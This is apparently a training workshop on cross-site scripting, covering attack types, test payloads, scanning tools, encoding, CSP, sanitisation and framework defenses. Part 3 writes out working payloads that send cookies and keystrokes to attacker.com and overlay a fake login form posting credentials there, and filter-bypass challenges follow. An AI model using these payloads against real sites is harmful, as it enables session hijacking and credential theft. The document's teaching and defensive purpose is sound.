# XSS Prevention Workshop

## Objective
Learn about Cross-Site Scripting (XSS) vulnerabilities, understand different types of XSS attacks, and implement comprehensive prevention strategies.

## Prerequisites
- Basic HTML/JavaScript knowledge
- Understanding of web applications
- Access to a test environment

## Lab Overview
In this workshop, you will:
1. Understand XSS attack vectors
2. Identify XSS vulnerabilities
3. Exploit different types of XSS
4. Implement prevention techniques
5. Test and validate defenses

## Part 1: Understanding XSS

### Exercise 1.1: XSS Types
**Three main types of XSS:**

1. **Reflected XSS** (Non-persistent)
   - Payload in request, reflected in response
   - Example: Search results, error messages

2. **Stored XSS** (Persistent)
   - Payload stored in database
   - Example: Comments, user profiles

3. **DOM-based XSS**
   - Payload executed through DOM manipulation
   - Example: Client-side URL handling

### Exercise 1.2: Basic XSS Payloads
Test payloads for detection:
```javascript
// Basic alert
<script>alert('XSS')</script>

// Image tag
<img src=x onerror=alert('XSS')>

// Event handlers
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

// SVG
<svg onload=alert('XSS')>

// Data URI
<img src="data:text/html,<script>alert('XSS')</script>">
```

## Part 2: Identifying XSS Vulnerabilities

### Exercise 2.1: Manual Testing
Common injection points:
```html
<!-- URL parameters -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- Form inputs -->
<input type="text" value="<script>alert('XSS')</script>">

<!-- Hidden fields -->
<input type="hidden" value=""><script>alert('XSS')</script>">

<!-- Attributes -->
<div title=""><script>alert('XSS')</script>"></div>

<!-- JavaScript context -->
<script>var user = ""; alert('XSS'); //";</script>
```

### Exercise 2.2: Automated Scanning
Using tools for XSS detection:
```bash
# XSStrike
python xsstrike.py -u "http://example.com/search?q=test"

# Dalfox
dalfox url http://example.com/search?q=test

# Using Burp Suite
# 1. Intercept request
# 2. Send to Intruder
# 3. Use XSS payload list
# 4. Analyze responses
```

## Part 3: XSS Exploitation Techniques

### Exercise 3.1: Cookie Stealing
```javascript
// Basic cookie stealer
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

// Using image tag
<img src=x onerror="this.src='http://attacker.com/steal.php?cookie='+document.cookie">

// XMLHttpRequest
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
xhr.send();
</script>
```

### Exercise 3.2: Keylogging
```javascript
<script>
document.addEventListener('keypress', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/log.php?key=' + e.key);
    xhr.send();
});
</script>
```

### Exercise 3.3: Phishing Forms
```javascript
<script>
document.body.innerHTML += `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <h2>Session Expired - Please Login</h2>
    <form action="http://attacker.com/phish.php">
        Username: <input name="user"><br>
        Password: <input type="password" name="pass"><br>
        <input type="submit" value="Login">
    </form>
</div>`;
</script>
```

## Part 4: Context-Specific Attacks

### Exercise 4.1: HTML Context
```html
<!-- Breaking out of tags -->
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>

<!-- Event handlers -->
" onmouseover="alert('XSS')
' onclick='alert("XSS")

<!-- Style attribute -->
<div style="background:url('javascript:alert(1)')">
```

### Exercise 4.2: JavaScript Context
```javascript
// Breaking out of strings
'; alert('XSS'); //
"; alert('XSS'); //

// Template literals
${alert('XSS')}

// Function calls
');alert('XSS');//
```

### Exercise 4.3: URL Context
```html
<!-- javascript: protocol -->
<a href="javascript:alert('XSS')">Click</a>

<!-- data: URI -->
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>

<!-- vbscript: (IE) -->
<a href="vbscript:msgbox('XSS')">Click</a>
```

## Part 5: Prevention Techniques

### Exercise 5.1: Output Encoding
**HTML Entity Encoding:**
```php
// PHP
function htmlEncode($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

// Usage
echo "Hello " . htmlEncode($_GET['name']);
```

**JavaScript Encoding:**
```javascript
function jsEncode(data) {
    return JSON.stringify(data);
}

// Usage
var userName = <?php echo json_encode($_GET['name']); ?>;
```

### Exercise 5.2: Content Security Policy (CSP)
```html
<!-- Basic CSP header -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

<!-- Meta tag -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-random123'">

<!-- Nonce usage -->
<script nonce="random123">
    // This script will execute
    console.log('Trusted script');
</script>
```

### Exercise 5.3: Input Validation
```javascript
// Whitelist validation
function validateInput(input, type) {
    const patterns = {
        alphanumeric: /^[a-zA-Z0-9]+$/,
        email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        url: /^https?:\/\/.+$/
    };
    
    return patterns[type] ? patterns[type].test(input) : false;
}

// Sanitization
function sanitizeHTML(html) {
    const temp = document.createElement('div');
    temp.textContent = html;
    return temp.innerHTML;
}
```

## Part 6: Framework-Specific Prevention

### Exercise 6.1: React
```jsx
// Safe by default
function SafeComponent({ userInput }) {
    return <div>{userInput}</div>; // Automatically escaped
}

// Dangerous - avoid!
function UnsafeComponent({ htmlContent }) {
    return <div dangerouslySetInnerHTML={{__html: htmlContent}} />;
}

// Safe alternative
import DOMPurify from 'dompurify';
function SafeHTML({ htmlContent }) {
    const clean = DOMPurify.sanitize(htmlContent);
    return <div dangerouslySetInnerHTML={{__html: clean}} />;
}
```

### Exercise 6.2: Angular
```typescript
// Safe by default
@Component({
    template: '<div>{{userInput}}</div>' // Automatically escaped
})

// Bypassing sanitization (dangerous!)
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

// Use sanitization
this.sanitizer.sanitize(SecurityContext.HTML, userInput);
```

### Exercise 6.3: Vue.js
```vue
<template>
  <!-- Safe by default -->
  <div>{{ userInput }}</div>
  
  <!-- HTML content (dangerous!) -->
  <div v-html="htmlContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    safeHTML() {
      return DOMPurify.sanitize(this.htmlContent);
    }
  }
}
</script>
```

## Part 7: Advanced Defense Strategies

### Exercise 7.1: HTTP Headers
```
# Security headers
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
```

### Exercise 7.2: DOM-based XSS Prevention
```javascript
// Dangerous sinks to avoid
element.innerHTML = userInput;           // Use textContent instead
element.outerHTML = userInput;          // Use textContent instead
document.write(userInput);              // Avoid completely
eval(userInput);                        // Never use with user input

// Safe alternatives
element.textContent = userInput;
element.setAttribute('value', userInput);

// Safe DOM manipulation
const safeElement = document.createElement('div');
safeElement.textContent = userInput;
document.body.appendChild(safeElement);
```

### Exercise 7.3: Third-Party Libraries
```javascript
// DOMPurify configuration
const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
});

// js-xss library
const xss = require('xss');
const safeHTML = xss(userInput, {
    whiteList: {
        a: ['href', 'title'],
        b: [],
        i: [],
        strong: []
    }
});
```

## Lab Challenges

### Challenge 1: Bypass Filters
Given these filters, find XSS that works:
```javascript
// Filter 1: Removes <script> tags
input.replace(/<script>/gi, '').replace(/<\/script>/gi, '');

// Filter 2: Removes 'javascript:'
input.replace(/javascript:/gi, '');

// Filter 3: Basic HTML encoding
input.replace(/</g, '&lt;').replace(/>/g, '&gt;');
```

### Challenge 2: CSP Bypass
Find XSS that works with this CSP:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com
```

### Challenge 3: Stored XSS Hunt
Find and exploit stored XSS in:
- User profile bio
- Comment system
- File upload (SVG)
- JSON endpoints

## Testing Methodology

### XSS Testing Checklist:
- [ ] Test all input fields
- [ ] Test URL parameters
- [ ] Test HTTP headers
- [ ] Test file uploads
- [ ] Test JSON/API inputs
- [ ] Test error messages
- [ ] Test search functionality
- [ ] Test user profiles
- [ ] Test comment systems
- [ ] Test admin panels

### Payload Categories:
1. **Basic**: `<script>alert(1)</script>`
2. **IMG**: `<img src=x onerror=alert(1)>`
3. **SVG**: `<svg onload=alert(1)>`
4. **Event**: `<x onclick=alert(1)>click`
5. **Protocol**: `<a href="javascript:alert(1)">test</a>`
6. **Encoded**: Various encoding techniques

## Best Practices

### Development Guidelines:
1. **Context-aware encoding**: Encode based on output context
2. **Input validation**: Validate on server-side
3. **Content Security Policy**: Implement strict CSP
4. **Framework security features**: Use built-in protections
5. **Regular updates**: Keep libraries updated
6. **Security testing**: Include in CI/CD pipeline
7. **Code reviews**: Focus on XSS-prone areas

### Security Architecture:
- Principle of least privilege
- Defense in depth
- Input validation
- Output encoding
- CSP implementation
- Regular security audits
- Security awareness training

## Conclusion
This workshop covered:
- XSS attack types and techniques
- Vulnerability identification
- Context-specific exploits
- Prevention strategies
- Framework-specific defenses
- Testing methodologies

Remember: XSS remains one of the most common web vulnerabilities. Proper prevention requires understanding both attack and defense techniques.

## Additional Resources
- OWASP XSS Prevention Cheat Sheet
- PortSwigger XSS Tutorial
- Google's XSS Game
- Content Security Policy Reference 